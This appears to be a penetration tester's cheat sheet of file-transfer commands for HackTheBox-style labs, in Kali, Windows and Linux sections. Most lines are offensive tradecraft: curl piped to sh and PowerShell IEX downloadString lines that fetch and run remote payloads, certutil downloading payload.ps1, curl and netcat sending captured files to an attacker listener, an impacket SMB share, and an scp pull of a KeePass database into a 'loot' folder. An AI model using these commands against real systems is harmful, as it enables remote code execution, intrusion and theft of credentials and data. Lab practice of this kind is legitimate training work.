---
title: transfers
---

# transfers

## kali
- host www `python3 -m http.server 8080`
- netcat 
    - capture file `nc -nlvp 8000 > cap.linpeas`
- smb
    - `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/dbcyph0n/htb/share/`
- ssh 
    - get `scp lnorgaard@10.10.11.227:passcodes.kdbx ~/dbcyph0n/git/htb/machines/keeper/loot/passcodes.kdbx`



## windows
- get
    - `curl http://$ip:8080/linpeas.sh | sh`
    - `certutil.exe -split -f -urlcache http://$kali/payload.ps1`
    - `powershell -c 'IEX(New-Object Net.WebClient).downloadString("http://$kali/payload.ps1")'`
- send
    - to netcat `curl -F 'attachment=@cap.linpeas' http://10.10.14.14:8000`
- smb
    - to smbserver.py `\\10.10.14\140\CompData`
    - map network drive with creds `net use \\$kail\$sharename /u:$username $password; cd \\$kali\$sharename`


## linux


curl -L http://10.10.14.14:8080/linpeas.sh | sh